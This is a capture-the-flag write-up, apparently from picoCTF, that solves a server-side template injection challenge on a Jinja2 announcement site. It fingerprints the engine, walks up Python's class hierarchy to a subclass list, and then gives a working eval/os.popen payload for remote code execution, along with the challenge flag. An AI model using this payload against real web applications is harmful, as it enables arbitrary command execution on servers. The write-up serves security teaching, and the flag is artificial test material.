# Problem
A cool website was created where users can announce anything they want. The site uses templating, which is a modular way to build web apps. The challenge can be accessed [here].  
**Hint:** Server Side Template Injection

# Solution
First, it is important to determine the type of template engine in use. By submitting `{{ 10*10 }}`, the output "100" suggests that the engine is either Python (Jinja2) or PHP (Twig).  
This can be confirmed with the command:  
`{{ ''.__class__ }}` → "<class 'str'>", indicating a Python string.

Further testing reveals:  
`{{ ''.__class__.__mro__[1] }}` → Retrieves the base object class.

`{{ ''.__class__.__mro__[1].__subclasses__() }}` → Lists all subclasses.

A vulnerable subclass was found at index 133 (note that this index may vary depending on the environment). To exploit this, the subclasses are enumerated to find one that allows access to dangerous built-ins. For example:

```python
{{ ''.__class__.__mro__[1].__subclasses__()[133] }}
```

This reveals the subclass `<class 'warnings.catch_warnings'>`, which can be leveraged for code execution. The exact index may differ, so it may be necessary to iterate through the list to find the appropriate class.  
After further exploration, the following payload was constructed:  
`{{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat flag').read()") }}`

Flag: `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_eb0c6390}`

It is always advisable to look for classes such as "__globals__", "__builtins__", "os", or "subprocess".
